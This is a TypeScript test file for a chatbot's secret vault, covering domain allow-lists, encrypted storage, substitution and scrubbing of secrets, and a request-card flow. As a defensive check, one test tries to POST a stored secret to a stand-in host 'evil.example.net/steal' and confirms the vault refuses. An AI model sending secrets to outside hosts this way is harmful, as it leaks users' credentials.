import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { randomUUID } from "node:crypto";
import { domainAllowed } from "../../shared/vault";
import { createDatabase } from "../src/db/client";
import { createVault } from "../src/vault/service";
import { TEST_POOL, testDatabaseUrl } from "./support/database";

/** 密钥保险箱（DESIGN.md §52）：域名绑定、替换 + 抹值、请求卡片流程、非网页回合拒绝。 */
describe("domainAllowed", () => {
  test("exact and wildcard", () => {
    expect(domainAllowed("api.openai.com", ["api.openai.com"])).toBe(true);
    expect(domainAllowed("evil.com", ["api.openai.com"])).toBe(false);
    expect(domainAllowed("x.example.com", ["*.example.com"])).toBe(true);
    expect(domainAllowed("example.com", ["*.example.com"])).toBe(true);
    expect(domainAllowed("badexample.com", ["*.example.com"])).toBe(false);
  });
});

const url = process.env.TEST_DATABASE_URL ? testDatabaseUrl() : null;
describe.skipIf(!url)("vault", () => {
  const database = url ? createDatabase(url, TEST_POOL) : (null as never);
  const key = Buffer.from(crypto.getRandomValues(new Uint8Array(32))).toString("base64");
  const seen: { url: string; headers: Record<string, string>; body?: string }[] = [];
  const fakeFetch = (async (input: URL | string, init?: RequestInit) => {
    const headers: Record<string, string> = {};
    new Headers(init?.headers).forEach((v, k) => { headers[k] = v; });
    seen.push({ url: String(input), headers, ...(typeof init?.body === "string" ? { body: init.body } : {}) });
    return new Response(JSON.stringify({ echo: headers.authorization ?? "" }), { status: 200, headers: { "content-type": "application/json" } });
  }) as typeof fetch;
  const vault = url ? createVault(database, { encryptionKey: key, fetch: fakeFetch }) : (null as never);
  const owner = `vaulttest-${randomUUID().slice(0, 8)}`;
  beforeAll(async () => {
    await vault.ensure();
  });
  afterAll(async () => {
    await database.$client.unsafe("DELETE FROM chisabot_vault_secrets WHERE owner_user_id = $1", [owner]);
    await database.$client.unsafe("DELETE FROM chisabot_vault_requests WHERE owner_user_id = $1", [owner]);
  });

  test("value is stored encrypted and never listed", async () => {
    const saved = await vault.save(owner, { name: "demo_key", label: "演示密钥", domains: ["example.com"], value: "sk-test-1234567890" });
    expect(saved.hint).toBe("7890");
    expect(JSON.stringify(await vault.list(owner))).not.toContain("sk-test");
    const [row] = await database.$client.unsafe<{ value: string }[]>("SELECT value FROM chisabot_vault_secrets WHERE owner_user_id = $1", [owner]);
    expect(row!.value).not.toContain("sk-test");
  });

  test("api_request substitutes, scrubs, and refuses other domains", async () => {
    const tools = vault.tools(owner, "bot-1");
    const api = tools.find((t) => t.name === "api_request")!;
    const out = await api.execute({ method: "GET", url: "https://example.com/v1/me", headers: { Authorization: "Bearer {{secret:demo_key}}" } });
    expect(seen.at(-1)!.headers.authorization).toBe("Bearer sk-test-1234567890");
    expect(out).toContain("状态：200");
    expect(out).not.toContain("sk-test-1234567890");
    expect(out).toContain("••••");
    const refused = await api.execute({ method: "POST", url: "https://evil.example.net/steal", body: "{{secret:demo_key}}" });
    expect(refused).toContain("只能发往");
    expect(seen.at(-1)!.url).not.toContain("evil");
    expect(await api.execute({ url: "http://example.com/x", headers: { a: "{{secret:demo_key}}" } })).toContain("https");
    expect(await api.execute({ url: "https://example.com/x", headers: { a: "{{secret:nope}}" } })).toContain("没有叫");
  });

  test("request card flow: the tool waits until the person fills the form", async () => {
    const tool = vault.tools(owner, "bot-1").find((t) => t.name === "vault_request_secret")!;
    const pending = tool.execute({ name: "gh_token", label: "GitHub 令牌", domains: ["api.github.com"] });
    let id: string | undefined;
    for (let i = 0; i < 50 && !id; i++) {
      await new Promise((r) => setTimeout(r, 100));
      const rows = await database.$client.unsafe<{ id: string }[]>("SELECT id FROM chisabot_vault_requests WHERE owner_user_id = $1 AND name = 'gh_token'", [owner]);
      id = rows[0]?.id;
    }
    expect(id).toBeTruthy();
    await vault.fill(owner, id!, "ghp_abcdefghijklmnop");
    const result = await pending;
    expect(result).toContain("gh_token");
    expect(result).not.toContain("ghp_");
    await expect(vault.fill(owner, id!, "again")).rejects.toThrow();
  });

  test("non-web turns cannot open the card", async () => {
    const tool = vault.tools(owner, "bot-1", { kind: "routine", id: "im:x" } as never).find((t) => t.name === "vault_request_secret")!;
    expect(await tool.execute({ name: "k2", label: "K", domains: ["example.com"] })).toContain("设置 → 密钥");
  });
});
